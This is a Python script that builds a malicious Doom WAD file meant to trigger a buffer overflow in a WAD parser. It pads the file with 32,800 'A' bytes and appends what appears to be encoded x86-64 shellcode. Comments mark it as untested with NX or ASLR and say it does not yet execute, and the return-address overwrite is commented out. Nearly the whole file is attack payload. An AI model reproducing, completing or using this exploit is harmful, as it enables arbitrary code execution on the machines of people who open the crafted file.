#!/usr/bin/python
# -*- coding: utf-8 -*-

###############################
# NOT TESTED WITH NX OR ASLR  #
###############################
#still no exec too :(

from struct import *

buf =  "PWADx"
buf += bytearray('\x00\x00\x00')
buf += "xx"
buf += bytearray('\x00\x00')
buf += "A" * 32800 #offset of $rsp + some random number lol
buf += "\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05"
buf += "\xef\xff\xff\xff\x48\xbb\xcd\x34\x0e\xad\x72\x03\x4c"
buf += "\x4c\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += "\x31\x7c\x8d\x49\x82\xeb\x8c\x4c\xcd\x34\x4f\xfc\x33"
buf += "\x53\x1e\x1d\x9b\x7c\x3f\x7f\x17\x4b\xc7\x1e\xad\x7c"
buf += "\x85\xff\x6a\x4b\xc7\x1e\xed\x7c\x85\xdf\x22\x4b\x43"
buf += "\xfb\x87\x7e\x43\x9c\xbb\x4b\x7d\x8c\x61\x08\x6f\xd1"
buf += "\x70\x2f\x6c\x0d\x0c\xfd\x03\xec\x73\xc2\xae\xa1\x9f"
buf += "\x75\x5f\xe5\xf9\x51\x6c\xc7\x8f\x08\x46\xac\xa2\x88"
buf += "\xcc\xc4\xcd\x34\x0e\xe5\xf7\xc3\x38\x2b\x85\x35\xde"
buf += "\xfd\xf9\x4b\x54\x08\x46\x74\x2e\xe4\x73\xd3\xaf\x1a"
buf += "\x85\xcb\xc7\xec\xf9\x37\xc4\x04\xcc\xe2\x43\x9c\xbb"
buf += "\x4b\x7d\x8c\x61\x75\xcf\x64\x7f\x42\x4d\x8d\xf5\xd4"
buf += "\x7b\x5c\x3e\x00\x00\x68\xc5\x71\x37\x7c\x07\xdb\x14"
buf += "\x08\x46\x74\x2a\xe4\x73\xd3\x2a\x0d\x46\x38\x46\xe9"
buf += "\xf9\x43\x50\x05\xcc\xe4\x4f\x26\x76\x8b\x04\x4d\x1d"
buf += "\x75\x56\xec\x2a\x5d\x15\x16\x8c\x6c\x4f\xf4\x33\x59"
buf += "\x04\xcf\x21\x14\x4f\xff\x8d\xe3\x14\x0d\x94\x6e\x46"
buf += "\x26\x60\xea\x1b\xb3\x32\xcb\x53\xe5\xc8\x02\x4c\x4c"
buf += "\xcd\x34\x0e\xad\x72\x4b\xc1\xc1\xcc\x35\x0e\xad\x33"
buf += "\xb9\x7d\xc7\xa2\xb3\xf1\x78\xc9\xf3\xf9\xee\x9b\x75"
buf += "\xb4\x0b\xe7\xbe\xd1\xb3\x18\x7c\x8d\x69\x5a\x3f\x4a"
buf += "\x30\xc7\xb4\xf5\x4d\x07\x06\xf7\x0b\xde\x46\x61\xc7"
buf += "\x72\x5a\x0d\xc5\x17\xcb\xdb\xce\x13\x6f\x2f\x62\xa8"
buf += "\x4c\x6b\xad\x72\x03\x4c\x4c"

#rip =  "\x02\x64\x22\xb8"
#rip =  "\xb8\x22\x64\x02" #lol fuck little endian
#buf += pack("<Q", 0x14f1c82)
#buf += "A" * 201303 #'fill' the wadfile

payload = buf #+ rip

f = open("exploit.wad", "w")
f.write(payload)


